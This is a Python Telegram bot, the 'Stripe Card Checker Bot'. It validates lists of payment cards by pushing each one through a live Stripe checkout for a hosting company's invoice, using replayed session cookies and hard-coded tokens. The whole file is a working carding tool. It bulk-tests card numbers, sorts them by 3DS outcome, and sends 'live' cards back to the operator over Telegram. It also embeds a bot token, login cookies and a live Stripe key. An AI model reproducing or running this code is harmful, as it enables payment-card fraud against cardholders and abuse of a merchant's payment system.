import telebot
import threading
import time
import re
import requests
import urllib3
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Telegram Bot Token
TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
bot = telebot.TeleBot(TOKEN)

# Invoice and Cookies
INVOICE_ID = "260528"
cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761317576$o6$g1$t1761318687$j60$l0$h31096134',
}

# Dashboard counters
dashboard = {
    "live": 0,
    "declined": 0,
    "error": 0,
    "3ds": 0,
    "challenge": 0
}

# State variables
checking = False
cards = []
results = []
current_message_id = None
stop_checking = False
last_dashboard_text = ""

def get_session_data():
    session = requests.Session()
    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
    try:
        session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', 
                    data=data, cookies=cookies, verify=False, timeout=10)
    except requests.exceptions.ConnectTimeout:
        return None, None, None
    except:
        pass
    try:
        resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                          cookies=cookies, verify=False, timeout=10)
    except requests.exceptions.ConnectTimeout:
        return None, None, None
    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
    if not m or '/pay/' not in m.group(0):
        return None, None, None
    session_id = m.group(0).split('/pay/')[1].split('#')[0]
    new_cookies = session.cookies.get_dict()
    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
    stripe_sid = new_cookies.get('__stripe_sid', '')
    if not stripe_sid:
        time.sleep(2)
        try:
            resp2 = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                               cookies=cookies, verify=False, timeout=10)
            new_cookies2 = resp2.cookies.get_dict()
            stripe_sid = new_cookies2.get('__stripe_sid', '')
        except requests.exceptions.ConnectTimeout:
            return None, None, None
    return session_id, stripe_mid, stripe_sid

def check_card(card, index):
    global dashboard, stop_checking
    if stop_checking:
        results[index] = "🛑 Stopped"
        return
    parts = card.strip().split('|')
    if len(parts) != 4:
        results[index] = "❌ Invalid format"
        dashboard["error"] += 1
        return
    cc, mm, yy, cvv = parts
    session_id, mid, sid = get_session_data()
    if not session_id:
        results[index] = "❌ Session failed"
        dashboard["error"] += 1
        return
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    pm_data = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
        'billing_details[name]=Card+details&billing_details[email]=test%40test.com&'
        f'billing_details[address][country]=EG&muid={mid}'
    )
    if sid:
        pm_data += f'&sid={sid}'
    pm_data += (
        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
        f'client_attribution_metadata[checkout_session_id]={session_id}'
    )
    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                          headers=headers, data=pm_data, timeout=15)
        pm_res = r1.json()
        if 'error' in pm_res:
            results[index] = f"❌ {pm_res['error'].get('message', 'Error')}"
            dashboard["error"] += 1
            return
        if 'id' not in pm_res:
            results[index] = "❌ PM creation failed"
            dashboard["error"] += 1
            return
        pm_id = pm_res['id']
        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
        if mid:
            confirm_data += f'&muid={mid}'
        if sid:
            confirm_data += f'&sid={sid}'
        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                          headers=headers, data=confirm_data, timeout=15)
        confirm_res = r2.json()
        if 'payment_intent' not in confirm_res:
            results[index] = "⚠️ No payment_intent"
            dashboard["error"] += 1
            return
        pi = confirm_res['payment_intent']
        status = pi.get('status')
        if status == 'succeeded':
            results[index] = "✅ Approved"
            dashboard["live"] += 1
            bot.send_message(current_message_id.chat.id, f"✅ Live Card: {card}")
            return
        if status == 'requires_action':
            na = pi.get('next_action', {})
            if na.get('type') == 'use_stripe_sdk':
                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if source_id:
                    tds_data = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate',
                                      headers=headers, data=tds_data, timeout=15)
                    tds_res = r3.json()
                    trans = tds_res.get('ares', {}).get('transStatus')
                    if not trans:
                        trans = tds_res.get('transStatus')
                    if not trans and 'state' in tds_res:
                        state = tds_res.get('state')
                        if state == 'succeeded':
                            results[index] = "✅ Approved (3DS)"
                            dashboard["live"] += 1
                            bot.send_message(current_message_id.chat.id, f"✅ Live Card (3DS): {card}")
                            return
                        elif state == 'failed':
                            results[index] = "❌ Declined (3DS)"
                            dashboard["3ds"] += 1
                            return
                    if trans == 'Y':
                        results[index] = "✅ Approved (3DS)"
                        dashboard["live"] += 1
                        bot.send_message(current_message_id.chat.id, f"✅ Live Card (3DS): {card}")
                        return
                    elif trans == 'N':
                        results[index] = "✅ Live"
                        dashboard["live"] += 1
                        bot.send_message(current_message_id.chat.id, f"✅ Live Card: {card}")
                        return
                    elif trans == 'C':
                        results[index] = "⚠️ Challenge Required"
                        dashboard["challenge"] += 1
                        return
                    elif trans == 'R':
                        results[index] = "❌ Rejected"
                        dashboard["declined"] += 1
                        return
                    else:
                        results[index] = f"⚠️ 3DS Response: {str(tds_res)[:50]}"
                        dashboard["error"] += 1
                        return
        error = pi.get('last_payment_error', {})
        if error:
            results[index] = f"❌ {error.get('message', error.get('code', status))}"
            dashboard["declined"] += 1
            return
        results[index] = f"❌ {status}"
        dashboard["declined"] += 1
    except Exception as e:
        results[index] = f"❌ {str(e)[:30]}"
        dashboard["error"] += 1

def update_dashboard(chat_id, message_id):
    global last_dashboard_text
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(f"Live: {dashboard['live']}", callback_data="live"))
    keyboard.add(InlineKeyboardButton(f"Declined: {dashboard['declined']}", callback_data="declined"))
    keyboard.add(InlineKeyboardButton(f"Error: {dashboard['error']}", callback_data="error"))
    keyboard.add(InlineKeyboardButton(f"3DS: {dashboard['3ds']}", callback_data="3ds"))
    keyboard.add(InlineKeyboardButton(f"Challenge: {dashboard['challenge']}", callback_data="challenge"))
    keyboard.add(InlineKeyboardButton("Stop Checking", callback_data="stop"))
    text = f"📊 Dashboard\nLive: {dashboard['live']}\nDeclined: {dashboard['declined']}\nError: {dashboard['error']}\n3DS: {dashboard['3ds']}\nChallenge: {dashboard['challenge']}"
    if text != last_dashboard_text:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard)
            last_dashboard_text = text
        except telebot.apihelper.ApiTelegramException as e:
            if "message is not modified" not in str(e):
                raise e

@bot.message_handler(commands=['start'])
def start(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("Check Single Card", callback_data="single"))
    keyboard.add(InlineKeyboardButton("Upload Combo File", callback_data="combo"))
    bot.reply_to(message, "Welcome to Stripe Card Checker Bot! Choose an option:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global checking, cards, results, current_message_id, stop_checking
    if call.data == "single":
        bot.send_message(call.message.chat.id, "Enter card (number|month|year|cvv):")
        bot.register_next_step_handler(call.message, process_single_card)
    elif call.data == "combo":
        bot.send_message(call.message.chat.id, "Upload a text file with cards (number|month|year|cvv):")
        bot.register_next_step_handler(call.message, process_combo_file)
    elif call.data == "stop":
        stop_checking = True
        bot.answer_callback_query(call.id, "Checking stopped")

def process_single_card(message):
    global checking, cards, results, current_message_id, last_dashboard_text
    if checking:
        bot.reply_to(message, "Checking in progress, please wait.")
        return
    checking = True
    cards = [message.text]
    results = [None]
    last_dashboard_text = ""
    current_message_id = bot.send_message(message.chat.id, "📊 Dashboard\nStarting check...")
    threading.Thread(target=check_cards, args=(message.chat.id, current_message_id.message_id)).start()

def process_combo_file(message):
    global checking, cards, results, current_message_id, last_dashboard_text
    if checking:
        bot.reply_to(message, "Checking in progress, please wait.")
        return
    if not message.document:
        bot.reply_to(message, "Please upload a text file.")
        checking = False
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        file = bot.download_file(file_info.file_path)
        cards = file.decode('utf-8').splitlines()
        results = [None] * len(cards)
        last_dashboard_text = ""
        current_message_id = bot.send_message(message.chat.id, "📊 Dashboard\nStarting check...")
        threading.Thread(target=check_cards, args=(message.chat.id, current_message_id.message_id)).start()
    except Exception as e:
        bot.reply_to(message, f"Error processing file: {str(e)[:50]}")
        checking = False

def check_cards(chat_id, message_id):
    global checking, stop_checking, dashboard
    stop_checking = False
    dashboard = {"live": 0, "declined": 0, "error": 0, "3ds": 0, "challenge": 0}
    for i in range(0, len(cards), 3):
        if stop_checking:
            break
        batch = cards[i:i+3]
        batch_threads = []
        for j, card in enumerate(batch):
            t = threading.Thread(target=check_card, args=(card, i+j))
            batch_threads.append(t)
            t.start()
        for t in batch_threads:
            t.join()
        update_dashboard(chat_id, message_id)
        if i + 3 < len(cards):
            time.sleep(3)
    checking = False
    bot.send_message(chat_id, "✅ Checking completed.")

bot.polling()
